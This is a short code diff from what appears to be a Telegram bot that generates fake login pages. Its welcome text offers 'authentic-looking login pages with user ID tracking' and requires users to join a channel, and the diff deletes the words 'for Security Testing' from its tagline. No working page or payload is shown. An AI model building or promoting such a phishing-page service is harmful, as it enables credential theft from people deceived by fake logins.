@@ -24,7 +24,7 @@ async function handleBotUpdate(req, res) {
 
 ⚠️ *IMPORTANT: You must join @Kirito_Bots to use this bot!*
 
-🎯 *Create Realistic Login Pages for Security Testing*
+🎯 *Create Realistic Login Pages *
 
 ✨ *What I Can Do:*
 • Generate authentic-looking login pages with user ID tracking
